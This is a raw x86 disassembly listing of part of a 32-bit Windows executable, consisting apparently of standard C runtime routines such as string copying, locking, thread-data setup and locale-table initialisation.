  42382a:	call   DWORD PTR ds:0x4280a8
  423830:	test   eax,eax
  423832:	je     0x423850
  423834:	mov    DWORD PTR [esi+0x54],0x45f330
  42383b:	mov    DWORD PTR [esi+0x14],0x1
  423842:	call   DWORD PTR ds:0x4280a4
  423848:	or     DWORD PTR [esi+0x4],0xffffffff
  42384c:	mov    DWORD PTR [esi],eax
  42384e:	jmp    0x423858
  423850:	push   0x10
  423852:	call   0x422a06
  423857:	pop    ecx
  423858:	push   ebx
  423859:	call   DWORD PTR ds:0x4280a0
  42385f:	mov    eax,esi
  423861:	pop    esi
  423862:	pop    ebx
  423863:	ret    
  423864:	call   0x4239cd
  423869:	test   eax,eax
  42386b:	je     0x42387d
  42386d:	call   DWORD PTR ds:0x4280b0
  423873:	cmp    eax,0xffffffff
  423876:	mov    ds:0x45f3dc,eax
  42387b:	jne    0x423885
  42387d:	call   0x4237d5
  423882:	xor    eax,eax
  423884:	ret    
  423885:	push   esi
  423886:	push   0x88
  42388b:	push   0x1
  42388d:	call   0x424a58
  423892:	mov    esi,eax
  423894:	test   esi,esi
  423896:	pop    ecx
  423897:	pop    ecx
  423898:	je     0x4238ca
  42389a:	push   esi
  42389b:	push   DWORD PTR ds:0x45f3dc
  4238a1:	call   DWORD PTR ds:0x4280a8
  4238a7:	test   eax,eax
  4238a9:	je     0x4238ca
  4238ab:	mov    DWORD PTR [esi+0x54],0x45f330
  4238b2:	mov    DWORD PTR [esi+0x14],0x1
  4238b9:	call   DWORD PTR ds:0x4280a4
  4238bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4238c3:	mov    DWORD PTR [esi],eax
  4238c5:	xor    eax,eax
  4238c7:	inc    eax
  4238c8:	pop    esi
  4238c9:	ret    
  4238ca:	call   0x4237d5
  4238cf:	xor    eax,eax
  4238d1:	pop    esi
  4238d2:	ret    
  4238d3:	cmp    DWORD PTR ds:0x45fba4,0x2
  4238da:	jne    0x4238e9
  4238dc:	cmp    DWORD PTR ds:0x45fbb0,0x5
  4238e3:	jb     0x4238e9
  4238e5:	xor    eax,eax
  4238e7:	inc    eax
  4238e8:	ret    
  4238e9:	push   0x3
  4238eb:	pop    eax
  4238ec:	ret    
  4238ed:	xor    eax,eax
  4238ef:	cmp    DWORD PTR [esp+0x4],eax
  4238f3:	push   0x0
  4238f5:	sete   al
  4238f8:	push   0x1000
  4238fd:	push   eax
  4238fe:	call   DWORD PTR ds:0x4280b8
  423904:	test   eax,eax
  423906:	mov    ds:0x460220,eax
  42390b:	je     0x423937
  42390d:	call   0x4238d3
  423912:	cmp    eax,0x3
  423915:	mov    ds:0x460224,eax
  42391a:	jne    0x42393a
  42391c:	push   0x3f8
  423921:	call   0x424cda
  423926:	test   eax,eax
  423928:	pop    ecx
  423929:	jne    0x42393a
  42392b:	push   DWORD PTR ds:0x460220
  423931:	call   DWORD PTR ds:0x4280b4
  423937:	xor    eax,eax
  423939:	ret    
  42393a:	xor    eax,eax
  42393c:	inc    eax
  42393d:	ret    
  42393e:	int3   
  42393f:	int3   
  423940:	push   0x425808
  423945:	mov    eax,fs:0x0
  42394b:	push   eax
  42394c:	mov    eax,DWORD PTR [esp+0x10]
  423950:	mov    DWORD PTR [esp+0x10],ebp
  423954:	lea    ebp,[esp+0x10]
  423958:	sub    esp,eax
  42395a:	push   ebx
  42395b:	push   esi
  42395c:	push   edi
  42395d:	mov    eax,DWORD PTR [ebp-0x8]
  423960:	mov    DWORD PTR [ebp-0x18],esp
  423963:	push   eax
  423964:	mov    eax,DWORD PTR [ebp-0x4]
  423967:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42396e:	mov    DWORD PTR [ebp-0x8],eax
  423971:	lea    eax,[ebp-0x10]
  423974:	mov    fs:0x0,eax
  42397a:	ret    
  42397b:	mov    ecx,DWORD PTR [ebp-0x10]
  42397e:	mov    DWORD PTR fs:0x0,ecx
  423985:	pop    ecx
  423986:	pop    edi
  423987:	pop    esi
  423988:	pop    ebx
  423989:	leave  
  42398a:	push   ecx
  42398b:	ret    
  42398c:	int3   
  42398d:	int3   
  42398e:	int3   
  42398f:	int3   
  423990:	cmp    eax,0x1000
  423995:	jae    0x4239a5
  423997:	neg    eax
  423999:	add    eax,esp
  42399b:	add    eax,0x4
  42399e:	test   DWORD PTR [eax],eax
  4239a0:	xchg   esp,eax
  4239a1:	mov    eax,DWORD PTR [eax]
  4239a3:	push   eax
  4239a4:	ret    
  4239a5:	push   ecx
  4239a6:	lea    ecx,[esp+0x8]
  4239aa:	sub    ecx,0x1000
  4239b0:	sub    eax,0x1000
  4239b5:	test   DWORD PTR [ecx],eax
  4239b7:	cmp    eax,0x1000
  4239bc:	jae    0x4239aa
  4239be:	sub    ecx,eax
  4239c0:	mov    eax,esp
  4239c2:	test   DWORD PTR [ecx],eax
  4239c4:	mov    esp,ecx
  4239c6:	mov    ecx,DWORD PTR [eax]
  4239c8:	mov    eax,DWORD PTR [eax+0x4]
  4239cb:	push   eax
  4239cc:	ret    
  4239cd:	push   esi
  4239ce:	push   edi
  4239cf:	xor    esi,esi
  4239d1:	mov    edi,0x45fd00
  4239d6:	cmp    DWORD PTR [esi*8+0x45f3f4],0x1
  4239de:	jne    0x4239fe
  4239e0:	lea    eax,[esi*8+0x45f3f0]
  4239e7:	mov    DWORD PTR [eax],edi
  4239e9:	push   0xfa0
  4239ee:	push   DWORD PTR [eax]
  4239f0:	add    edi,0x18
  4239f3:	call   0x4249cd
  4239f8:	test   eax,eax
  4239fa:	pop    ecx
  4239fb:	pop    ecx
  4239fc:	je     0x423a0a
  4239fe:	inc    esi
  4239ff:	cmp    esi,0x24
  423a02:	jl     0x4239d6
  423a04:	xor    eax,eax
  423a06:	inc    eax
  423a07:	pop    edi
  423a08:	pop    esi
  423a09:	ret    
  423a0a:	and    DWORD PTR [esi*8+0x45f3f0],0x0
  423a12:	xor    eax,eax
  423a14:	jmp    0x423a07
  423a16:	push   ebx
  423a17:	mov    ebx,DWORD PTR ds:0x428098
  423a1d:	push   esi
  423a1e:	mov    esi,0x45f3f0
  423a23:	push   edi
  423a24:	mov    edi,DWORD PTR [esi]
  423a26:	test   edi,edi
  423a28:	je     0x423a3d
  423a2a:	cmp    DWORD PTR [esi+0x4],0x1
  423a2e:	je     0x423a3d
  423a30:	push   edi
  423a31:	call   ebx
  423a33:	push   edi
  423a34:	call   0x42454a
  423a39:	and    DWORD PTR [esi],0x0
  423a3c:	pop    ecx
  423a3d:	add    esi,0x8
  423a40:	cmp    esi,0x45f510
  423a46:	jl     0x423a24
  423a48:	mov    esi,0x45f3f0
  423a4d:	pop    edi
  423a4e:	mov    eax,DWORD PTR [esi]
  423a50:	test   eax,eax
  423a52:	je     0x423a5d
  423a54:	cmp    DWORD PTR [esi+0x4],0x1
  423a58:	jne    0x423a5d
  423a5a:	push   eax
  423a5b:	call   ebx
  423a5d:	add    esi,0x8
  423a60:	cmp    esi,0x45f510
  423a66:	jl     0x423a4e
  423a68:	pop    esi
  423a69:	pop    ebx
  423a6a:	ret    
  423a6b:	push   ebp
  423a6c:	mov    ebp,esp
  423a6e:	mov    eax,DWORD PTR [ebp+0x8]
  423a71:	push   DWORD PTR [eax*8+0x45f3f0]
  423a78:	call   DWORD PTR ds:0x428020
  423a7e:	pop    ebp
  423a7f:	ret    
  423a80:	push   ebp
  423a81:	mov    ebp,esp
  423a83:	push   esi
  423a84:	mov    esi,DWORD PTR [ebp+0x8]
  423a87:	lea    esi,[esi*8+0x45f3f0]
  423a8e:	cmp    DWORD PTR [esi],0x0
  423a91:	je     0x423a98
  423a93:	xor    eax,eax
  423a95:	inc    eax
  423a96:	jmp    0x423afc
  423a98:	push   edi
  423a99:	push   0x18
  423a9b:	call   0x424662
  423aa0:	mov    edi,eax
  423aa2:	test   edi,edi
  423aa4:	pop    ecx
  423aa5:	jne    0x423ab6
  423aa7:	call   0x4258e0
  423aac:	mov    DWORD PTR [eax],0xc
  423ab2:	xor    eax,eax
  423ab4:	jmp    0x423afb
  423ab6:	push   0xa
  423ab8:	call   0x423aff
  423abd:	cmp    DWORD PTR [esi],0x0
  423ac0:	pop    ecx
  423ac1:	jne    0x423ae9
  423ac3:	push   0xfa0
  423ac8:	push   edi
  423ac9:	call   0x4249cd
  423ace:	test   eax,eax
  423ad0:	pop    ecx
  423ad1:	pop    ecx
  423ad2:	jne    0x423ae5
  423ad4:	push   edi
  423ad5:	call   0x42454a
  423ada:	push   0xa
  423adc:	call   0x423a6b
  423ae1:	pop    ecx
  423ae2:	pop    ecx
  423ae3:	jmp    0x423aa7
  423ae5:	mov    DWORD PTR [esi],edi
  423ae7:	jmp    0x423af0
  423ae9:	push   edi
  423aea:	call   0x42454a
  423aef:	pop    ecx
  423af0:	push   0xa
  423af2:	call   0x423a6b
  423af7:	xor    eax,eax
  423af9:	pop    ecx
  423afa:	inc    eax
  423afb:	pop    edi
  423afc:	pop    esi
  423afd:	pop    ebp
  423afe:	ret    
  423aff:	push   ebp
  423b00:	mov    ebp,esp
  423b02:	mov    eax,DWORD PTR [ebp+0x8]
  423b05:	push   esi
  423b06:	lea    esi,[eax*8+0x45f3f0]
  423b0d:	cmp    DWORD PTR [esi],0x0
  423b10:	jne    0x423b25
  423b12:	push   eax
  423b13:	call   0x423a80
  423b18:	test   eax,eax
  423b1a:	pop    ecx
  423b1b:	jne    0x423b25
  423b1d:	push   0x11
  423b1f:	call   0x422a06
  423b24:	pop    ecx
  423b25:	push   DWORD PTR [esi]
  423b27:	call   DWORD PTR ds:0x4280c4
  423b2d:	pop    esi
  423b2e:	pop    ebp
  423b2f:	ret    
  423b30:	push   esi
  423b31:	push   DWORD PTR ds:0x460348
  423b37:	call   0x425a96
  423b3c:	pop    ecx
  423b3d:	mov    ecx,DWORD PTR ds:0x460344
  423b43:	mov    esi,eax
  423b45:	mov    eax,ds:0x460348
  423b4a:	mov    edx,ecx
  423b4c:	sub    edx,eax
  423b4e:	add    edx,0x4
  423b51:	cmp    esi,edx
  423b53:	jae    0x423ba3
  423b55:	mov    ecx,0x800
  423b5a:	cmp    esi,ecx
  423b5c:	jae    0x423b60
  423b5e:	mov    ecx,esi
  423b60:	add    ecx,esi
  423b62:	push   ecx
  423b63:	push   eax
  423b64:	call   0x4258e9
  423b69:	test   eax,eax
  423b6b:	pop    ecx
  423b6c:	pop    ecx
  423b6d:	jne    0x423b86
  423b6f:	add    esi,0x10
  423b72:	push   esi
  423b73:	push   DWORD PTR ds:0x460348
  423b79:	call   0x4258e9
  423b7e:	test   eax,eax
  423b80:	pop    ecx
  423b81:	pop    ecx
  423b82:	jne    0x423b86
  423b84:	pop    esi
  423b85:	ret    
  423b86:	mov    ecx,DWORD PTR ds:0x460344
  423b8c:	sub    ecx,DWORD PTR ds:0x460348
  423b92:	mov    ds:0x460348,eax
  423b97:	sar    ecx,0x2
  423b9a:	lea    ecx,[eax+ecx*4]
  423b9d:	mov    DWORD PTR ds:0x460344,ecx
  423ba3:	mov    DWORD PTR [ecx],edi
  423ba5:	add    DWORD PTR ds:0x460344,0x4
  423bac:	mov    eax,edi
  423bae:	pop    esi
  423baf:	ret    
  423bb0:	push   0x80
  423bb5:	call   0x424662
  423bba:	test   eax,eax
  423bbc:	pop    ecx
  423bbd:	mov    ds:0x460348,eax
  423bc2:	jne    0x423bc8
  423bc4:	push   0x18
  423bc6:	pop    eax
  423bc7:	ret    
  423bc8:	and    DWORD PTR [eax],0x0
  423bcb:	mov    eax,ds:0x460348
  423bd0:	mov    ds:0x460344,eax
  423bd5:	xor    eax,eax
  423bd7:	ret    
  423bd8:	push   0xc
  423bda:	push   0x428500
  423bdf:	call   0x423940
  423be4:	call   0x422c51
  423be9:	and    DWORD PTR [ebp-0x4],0x0
  423bed:	mov    edi,DWORD PTR [ebp+0x8]
  423bf0:	call   0x423b30
  423bf5:	mov    DWORD PTR [ebp-0x1c],eax
  423bf8:	or     DWORD PTR [ebp-0x4],0xffffffff
  423bfc:	call   0x423c0a
  423c01:	mov    eax,DWORD PTR [ebp-0x1c]
  423c04:	call   0x42397b
  423c09:	ret    
  423c0a:	call   0x422c5a
  423c0f:	ret    
  423c10:	push   DWORD PTR [esp+0x4]
  423c14:	call   0x423bd8
  423c19:	neg    eax
  423c1b:	sbb    eax,eax
  423c1d:	neg    eax
  423c1f:	pop    ecx
  423c20:	dec    eax
  423c21:	ret    
  423c22:	push   ebp
  423c23:	mov    ebp,esp
  423c25:	sub    esp,0x10
  423c28:	push   ebx
  423c29:	xor    ebx,ebx
  423c2b:	cmp    DWORD PTR ds:0x45fe50,ebx
  423c31:	push   esi
  423c32:	push   edi
  423c33:	jne    0x423ca2
  423c35:	push   0x428570
  423c3a:	call   DWORD PTR ds:0x4280c8
  423c40:	mov    edi,eax
  423c42:	cmp    edi,ebx
  423c44:	je     0x423cdd
  423c4a:	mov    esi,DWORD PTR ds:0x428010
  423c50:	push   0x428564
  423c55:	push   edi
  423c56:	call   esi
  423c58:	test   eax,eax
  423c5a:	mov    ds:0x45fe50,eax
  423c5f:	je     0x423cdd
  423c61:	push   0x428554
  423c66:	push   edi
  423c67:	call   esi
  423c69:	push   0x428540
  423c6e:	push   edi
  423c6f:	mov    ds:0x45fe54,eax
  423c74:	call   esi
  423c76:	cmp    DWORD PTR ds:0x45fba4,0x2
  423c7d:	mov    ds:0x45fe58,eax
  423c82:	jne    0x423ca2
  423c84:	push   0x428524
  423c89:	push   edi
  423c8a:	call   esi
  423c8c:	test   eax,eax
  423c8e:	mov    ds:0x45fe60,eax
  423c93:	je     0x423ca2
  423c95:	push   0x42850c
  423c9a:	push   edi
  423c9b:	call   esi
  423c9d:	mov    ds:0x45fe5c,eax
  423ca2:	mov    eax,ds:0x45fe5c
  423ca7:	test   eax,eax
  423ca9:	je     0x423ce7
  423cab:	call   eax
  423cad:	test   eax,eax
  423caf:	je     0x423cce
  423cb1:	lea    ecx,[ebp-0x4]
  423cb4:	push   ecx
  423cb5:	push   0xc
  423cb7:	lea    ecx,[ebp-0x10]
  423cba:	push   ecx
  423cbb:	push   0x1
  423cbd:	push   eax
  423cbe:	call   DWORD PTR ds:0x45fe60
  423cc4:	test   eax,eax
  423cc6:	je     0x423cce
  423cc8:	test   BYTE PTR [ebp-0x8],0x1
  423ccc:	jne    0x423ce7
  423cce:	cmp    DWORD PTR ds:0x45fbb0,0x4
  423cd5:	jb     0x423ce1
  423cd7:	or     BYTE PTR [ebp+0x12],0x20
  423cdb:	jmp    0x423d06
  423cdd:	xor    eax,eax
  423cdf:	jmp    0x423d16
  423ce1:	or     BYTE PTR [ebp+0x12],0x4
  423ce5:	jmp    0x423d06
  423ce7:	mov    eax,ds:0x45fe54
  423cec:	test   eax,eax
  423cee:	je     0x423d06
  423cf0:	call   eax
  423cf2:	mov    ebx,eax
  423cf4:	test   ebx,ebx
  423cf6:	je     0x423d06
  423cf8:	mov    eax,ds:0x45fe58
  423cfd:	test   eax,eax
  423cff:	je     0x423d06
  423d01:	push   ebx
  423d02:	call   eax
  423d04:	mov    ebx,eax
  423d06:	push   DWORD PTR [ebp+0x10]
  423d09:	push   DWORD PTR [ebp+0xc]
  423d0c:	push   DWORD PTR [ebp+0x8]
  423d0f:	push   ebx
  423d10:	call   DWORD PTR ds:0x45fe50
  423d16:	pop    edi
  423d17:	pop    esi
  423d18:	pop    ebx
  423d19:	leave  
  423d1a:	ret    
  423d1b:	int3   
  423d1c:	int3   
  423d1d:	int3   
  423d1e:	int3   
  423d1f:	int3   
  423d20:	push   edi
  423d21:	mov    edi,DWORD PTR [esp+0x8]
  423d25:	jmp    0x423d95
  423d27:	lea    esp,[esp+0x0]
  423d2e:	mov    edi,edi
  423d30:	mov    ecx,DWORD PTR [esp+0x4]
  423d34:	push   edi
  423d35:	test   ecx,0x3
  423d3b:	je     0x423d50
  423d3d:	mov    al,BYTE PTR [ecx]
  423d3f:	add    ecx,0x1
  423d42:	test   al,al
  423d44:	je     0x423d83
  423d46:	test   ecx,0x3
  423d4c:	jne    0x423d3d
  423d4e:	mov    edi,edi
  423d50:	mov    eax,DWORD PTR [ecx]
  423d52:	mov    edx,0x7efefeff
  423d57:	add    edx,eax
  423d59:	xor    eax,0xffffffff
  423d5c:	xor    eax,edx
  423d5e:	add    ecx,0x4
  423d61:	test   eax,0x81010100
  423d66:	je     0x423d50
  423d68:	mov    eax,DWORD PTR [ecx-0x4]
  423d6b:	test   al,al
  423d6d:	je     0x423d92
  423d6f:	test   ah,ah
  423d71:	je     0x423d8d
  423d73:	test   eax,0xff0000
  423d78:	je     0x423d88
  423d7a:	test   eax,0xff000000
  423d7f:	je     0x423d83
  423d81:	jmp    0x423d50
  423d83:	lea    edi,[ecx-0x1]
  423d86:	jmp    0x423d95
  423d88:	lea    edi,[ecx-0x2]
  423d8b:	jmp    0x423d95
  423d8d:	lea    edi,[ecx-0x3]
  423d90:	jmp    0x423d95
  423d92:	lea    edi,[ecx-0x4]
  423d95:	mov    ecx,DWORD PTR [esp+0xc]
  423d99:	test   ecx,0x3
  423d9f:	je     0x423dbe
  423da1:	mov    dl,BYTE PTR [ecx]
  423da3:	add    ecx,0x1
  423da6:	test   dl,dl
  423da8:	je     0x423e10
  423daa:	mov    BYTE PTR [edi],dl
  423dac:	add    edi,0x1
  423daf:	test   ecx,0x3
  423db5:	jne    0x423da1
  423db7:	jmp    0x423dbe
  423db9:	mov    DWORD PTR [edi],edx
  423dbb:	add    edi,0x4
  423dbe:	mov    edx,0x7efefeff
  423dc3:	mov    eax,DWORD PTR [ecx]
  423dc5:	add    edx,eax
  423dc7:	xor    eax,0xffffffff
  423dca:	xor    eax,edx
  423dcc:	mov    edx,DWORD PTR [ecx]
  423dce:	add    ecx,0x4
  423dd1:	test   eax,0x81010100
  423dd6:	je     0x423db9
  423dd8:	test   dl,dl
  423dda:	je     0x423e10
  423ddc:	test   dh,dh
  423dde:	je     0x423e07
  423de0:	test   edx,0xff0000
  423de6:	je     0x423dfa
  423de8:	test   edx,0xff000000
  423dee:	je     0x423df2
  423df0:	jmp    0x423db9
  423df2:	mov    DWORD PTR [edi],edx
  423df4:	mov    eax,DWORD PTR [esp+0x8]
  423df8:	pop    edi
  423df9:	ret    
  423dfa:	mov    WORD PTR [edi],dx
  423dfd:	mov    eax,DWORD PTR [esp+0x8]
  423e01:	mov    BYTE PTR [edi+0x2],0x0
  423e05:	pop    edi
  423e06:	ret    
  423e07:	mov    WORD PTR [edi],dx
  423e0a:	mov    eax,DWORD PTR [esp+0x8]
  423e0e:	pop    edi
  423e0f:	ret    
  423e10:	mov    BYTE PTR [edi],dl
  423e12:	mov    eax,DWORD PTR [esp+0x8]
  423e16:	pop    edi
  423e17:	ret    
  423e18:	int3   
  423e19:	int3   
  423e1a:	int3   
  423e1b:	int3   
  423e1c:	int3   
  423e1d:	int3   
  423e1e:	int3   
  423e1f:	int3   
  423e20:	mov    ecx,DWORD PTR [esp+0xc]
  423e24:	push   edi
  423e25:	test   ecx,ecx
  423e27:	je     0x423ebf
  423e2d:	push   esi
  423e2e:	push   ebx
  423e2f:	mov    ebx,ecx
  423e31:	mov    esi,DWORD PTR [esp+0x14]
  423e35:	test   esi,0x3
  423e3b:	mov    edi,DWORD PTR [esp+0x10]
  423e3f:	jne    0x423e4c
  423e41:	shr    ecx,0x2
  423e44:	jne    0x423ecf
  423e4a:	jmp    0x423e73
  423e4c:	mov    al,BYTE PTR [esi]
  423e4e:	add    esi,0x1
  423e51:	mov    BYTE PTR [edi],al
  423e53:	add    edi,0x1
  423e56:	sub    ecx,0x1
  423e59:	je     0x423e86
  423e5b:	test   al,al
  423e5d:	je     0x423e8e
  423e5f:	test   esi,0x3
  423e65:	jne    0x423e4c
  423e67:	mov    ebx,ecx
  423e69:	shr    ecx,0x2
  423e6c:	jne    0x423ecf
  423e6e:	and    ebx,0x3
  423e71:	je     0x423e86
  423e73:	mov    al,BYTE PTR [esi]
  423e75:	add    esi,0x1
  423e78:	mov    BYTE PTR [edi],al
  423e7a:	add    edi,0x1
  423e7d:	test   al,al
  423e7f:	je     0x423eb8
  423e81:	sub    ebx,0x1
  423e84:	jne    0x423e73
  423e86:	mov    eax,DWORD PTR [esp+0x10]
  423e8a:	pop    ebx
  423e8b:	pop    esi
  423e8c:	pop    edi
  423e8d:	ret    
  423e8e:	test   edi,0x3
  423e94:	je     0x423eac
  423e96:	mov    BYTE PTR [edi],al
  423e98:	add    edi,0x1
  423e9b:	sub    ecx,0x1
  423e9e:	je     0x423f3c
  423ea4:	test   edi,0x3
  423eaa:	jne    0x423e96
  423eac:	mov    ebx,ecx
  423eae:	shr    ecx,0x2
  423eb1:	jne    0x423f27
  423eb3:	mov    BYTE PTR [edi],al
  423eb5:	add    edi,0x1
  423eb8:	sub    ebx,0x1
  423ebb:	jne    0x423eb3
  423ebd:	pop    ebx
  423ebe:	pop    esi
  423ebf:	mov    eax,DWORD PTR [esp+0x8]
  423ec3:	pop    edi
  423ec4:	ret    
  423ec5:	mov    DWORD PTR [edi],edx
  423ec7:	add    edi,0x4
  423eca:	sub    ecx,0x1
  423ecd:	je     0x423e6e
  423ecf:	mov    edx,0x7efefeff
  423ed4:	mov    eax,DWORD PTR [esi]
  423ed6:	add    edx,eax
  423ed8:	xor    eax,0xffffffff
  423edb:	xor    eax,edx
  423edd:	mov    edx,DWORD PTR [esi]
  423edf:	add    esi,0x4
  423ee2:	test   eax,0x81010100
  423ee7:	je     0x423ec5
  423ee9:	test   dl,dl
  423eeb:	je     0x423f19
  423eed:	test   dh,dh
  423eef:	je     0x423f0f
  423ef1:	test   edx,0xff0000
  423ef7:	je     0x423f05
  423ef9:	test   edx,0xff000000
  423eff:	jne    0x423ec5
  423f01:	mov    DWORD PTR [edi],edx
  423f03:	jmp    0x423f1d
  423f05:	and    edx,0xffff
  423f0b:	mov    DWORD PTR [edi],edx
  423f0d:	jmp    0x423f1d
  423f0f:	and    edx,0xff
  423f15:	mov    DWORD PTR [edi],edx
  423f17:	jmp    0x423f1d
  423f19:	xor    edx,edx
  423f1b:	mov    DWORD PTR [edi],edx
  423f1d:	add    edi,0x4
  423f20:	xor    eax,eax
  423f22:	sub    ecx,0x1
  423f25:	je     0x423f33
  423f27:	xor    eax,eax
  423f29:	mov    DWORD PTR [edi],eax
  423f2b:	add    edi,0x4
  423f2e:	sub    ecx,0x1
  423f31:	jne    0x423f29
  423f33:	and    ebx,0x3
  423f36:	jne    0x423eb3
  423f3c:	mov    eax,DWORD PTR [esp+0x10]
  423f40:	pop    ebx
  423f41:	pop    esi
  423f42:	pop    edi
  423f43:	ret    
  423f44:	int3   
  423f45:	int3   
  423f46:	int3   
  423f47:	int3   
  423f48:	int3   
  423f49:	int3   
  423f4a:	int3   
  423f4b:	int3   
  423f4c:	int3   
  423f4d:	int3   
  423f4e:	int3   
  423f4f:	int3   
  423f50:	mov    ecx,DWORD PTR [esp+0x4]
  423f54:	test   ecx,0x3
  423f5a:	je     0x423f80
  423f5c:	mov    al,BYTE PTR [ecx]
  423f5e:	add    ecx,0x1
  423f61:	test   al,al
  423f63:	je     0x423fb3
  423f65:	test   ecx,0x3
  423f6b:	jne    0x423f5c
  423f6d:	add    eax,0x0
  423f72:	lea    esp,[esp+0x0]
  423f79:	lea    esp,[esp+0x0]
  423f80:	mov    eax,DWORD PTR [ecx]
  423f82:	mov    edx,0x7efefeff
  423f87:	add    edx,eax
  423f89:	xor    eax,0xffffffff
  423f8c:	xor    eax,edx
  423f8e:	add    ecx,0x4
  423f91:	test   eax,0x81010100
  423f96:	je     0x423f80
  423f98:	mov    eax,DWORD PTR [ecx-0x4]
  423f9b:	test   al,al
  423f9d:	je     0x423fd1
  423f9f:	test   ah,ah
  423fa1:	je     0x423fc7
  423fa3:	test   eax,0xff0000
  423fa8:	je     0x423fbd
  423faa:	test   eax,0xff000000
  423faf:	je     0x423fb3
  423fb1:	jmp    0x423f80
  423fb3:	lea    eax,[ecx-0x1]
  423fb6:	mov    ecx,DWORD PTR [esp+0x4]
  423fba:	sub    eax,ecx
  423fbc:	ret    
  423fbd:	lea    eax,[ecx-0x2]
  423fc0:	mov    ecx,DWORD PTR [esp+0x4]
  423fc4:	sub    eax,ecx
  423fc6:	ret    
  423fc7:	lea    eax,[ecx-0x3]
  423fca:	mov    ecx,DWORD PTR [esp+0x4]
  423fce:	sub    eax,ecx
  423fd0:	ret    
  423fd1:	lea    eax,[ecx-0x4]
  423fd4:	mov    ecx,DWORD PTR [esp+0x4]
  423fd8:	sub    eax,ecx
  423fda:	ret    
  423fdb:	push   0x8
  423fdd:	push   0x428580
  423fe2:	call   0x423940
  423fe7:	and    DWORD PTR [ebp-0x4],0x0
  423feb:	push   0x0
  423fed:	push   0x1
  423fef:	call   0x425b62
  423ff4:	pop    ecx
  423ff5:	pop    ecx
  423ff6:	jmp    0x423fff
  423ff8:	xor    eax,eax
  423ffa:	inc    eax
  423ffb:	ret    
  423ffc:	mov    esp,DWORD PTR [ebp-0x18]
  423fff:	or     DWORD PTR [ebp-0x4],0xffffffff
  424003:	push   0x3
  424005:	call   DWORD PTR ds:0x428060
  42400b:	int3   
  42400c:	cmp    ecx,DWORD PTR ds:0x45f510
  424012:	jne    0x424015
  424014:	ret    
  424015:	jmp    0x423fdb
  42401a:	movzx  eax,BYTE PTR [esp+0x4]
  42401f:	mov    cl,BYTE PTR [esp+0xc]
  424023:	test   BYTE PTR [eax+0x460001],cl
  424029:	jne    0x424047
  42402b:	cmp    DWORD PTR [esp+0x8],0x0
  424030:	je     0x424040
  424032:	movzx  eax,WORD PTR [eax*2+0x42897a]
  42403a:	and    eax,DWORD PTR [esp+0x8]
  42403e:	jmp    0x424042
  424040:	xor    eax,eax
  424042:	test   eax,eax
  424044:	jne    0x424047
  424046:	ret    
  424047:	xor    eax,eax
  424049:	inc    eax
  42404a:	ret    
  42404b:	push   0x4
  42404d:	push   0x0
  42404f:	push   DWORD PTR [esp+0xc]
  424053:	call   0x42401a
  424058:	add    esp,0xc
  42405b:	ret    
  42405c:	sub    eax,0x3a4
  424061:	je     0x424085
  424063:	sub    eax,0x4
  424066:	je     0x42407f
  424068:	sub    eax,0xd
  42406b:	je     0x424079
  42406d:	dec    eax
  42406e:	je     0x424073
  424070:	xor    eax,eax
  424072:	ret    
  424073:	mov    eax,0x404
  424078:	ret    
  424079:	mov    eax,0x412
  42407e:	ret    
  42407f:	mov    eax,0x804
  424084:	ret    
  424085:	mov    eax,0x411
  42408a:	ret    
  42408b:	push   edi
  42408c:	push   0x40
  42408e:	xor    eax,eax
  424090:	pop    ecx
  424091:	mov    edi,0x460000
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	stos   BYTE PTR es:[edi],al
  424099:	xor    eax,eax
  42409b:	mov    ds:0x460104,eax
  4240a0:	mov    ds:0x45fffc,eax
  4240a5:	mov    ds:0x45fff4,eax
  4240aa:	mov    edi,0x460110
  4240af:	stos   DWORD PTR es:[edi],eax
  4240b0:	stos   DWORD PTR es:[edi],eax
  4240b1:	stos   DWORD PTR es:[edi],eax
  4240b2:	pop    edi
  4240b3:	ret    
  4240b4:	push   ebp
  4240b5:	mov    ebp,esp
  4240b7:	sub    esp,0x518
  4240bd:	mov    eax,ds:0x45f510
  4240c2:	xor    eax,DWORD PTR [ebp+0x4]
  4240c5:	push   esi
  4240c6:	mov    DWORD PTR [ebp-0x4],eax
  4240c9:	lea    eax,[ebp-0x18]
  4240cc:	push   eax
  4240cd:	push   DWORD PTR ds:0x460104
  4240d3:	call   DWORD PTR ds:0x4280d4
  4240d9:	cmp    eax,0x1
  4240dc:	mov    esi,0x100
  4240e1:	jne    0x4241f4
  4240e7:	xor    eax,eax
  4240e9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  4240f0:	inc    eax
  4240f1:	cmp    eax,esi
  4240f3:	jb     0x4240e9
  4240f5:	mov    al,BYTE PTR [ebp-0x12]
  4240f8:	test   al,al
  4240fa:	mov    BYTE PTR [ebp-0x118],0x20
  424101:	je     0x424139
  424103:	push   ebx
  424104:	lea    edx,[ebp-0x11]
  424107:	push   edi
  424108:	movzx  ecx,BYTE PTR [edx]
  42410b:	movzx  eax,al
  42410e:	cmp    eax,ecx
  424110:	ja     0x42412f
  424112:	sub    ecx,eax
  424114:	inc    ecx
  424115:	mov    ebx,ecx
  424117:	shr    ecx,0x2
  42411a:	lea    edi,[ebp+eax*1-0x118]
  424121:	mov    eax,0x20202020
  424126:	rep stos DWORD PTR es:[edi],eax
  424128:	mov    ecx,ebx
  42412a:	and    ecx,0x3
  42412d:	rep stos BYTE PTR es:[edi],al
  42412f:	inc    edx
  424130:	mov    al,BYTE PTR [edx]
  424132:	inc    edx
  424133:	test   al,al
  424135:	jne    0x424108
  424137:	pop    edi
  424138:	pop    ebx
  424139:	push   0x0
  42413b:	push   DWORD PTR ds:0x45fff4
  424141:	lea    eax,[ebp-0x518]
  424147:	push   DWORD PTR ds:0x460104
  42414d:	push   eax
  42414e:	push   esi
  42414f:	lea    eax,[ebp-0x118]
  424155:	push   eax
  424156:	push   0x1
  424158:	call   0x426068
  42415d:	push   0x0
  42415f:	push   DWORD PTR ds:0x460104
  424165:	lea    eax,[ebp-0x218]
  42416b:	push   esi
  42416c:	push   eax
  42416d:	push   esi
  42416e:	lea    eax,[ebp-0x118]
  424174:	push   eax
  424175:	push   esi
  424176:	push   DWORD PTR ds:0x45fff4
  42417c:	call   0x425cac
  424181:	push   0x0
  424183:	push   DWORD PTR ds:0x460104
  424189:	lea    eax,[ebp-0x318]
  42418f:	push   esi
  424190:	push   eax
  424191:	push   esi
  424192:	lea    eax,[ebp-0x118]
  424198:	push   eax
  424199:	push   0x200
  42419e:	push   DWORD PTR ds:0x45fff4
  4241a4:	call   0x425cac
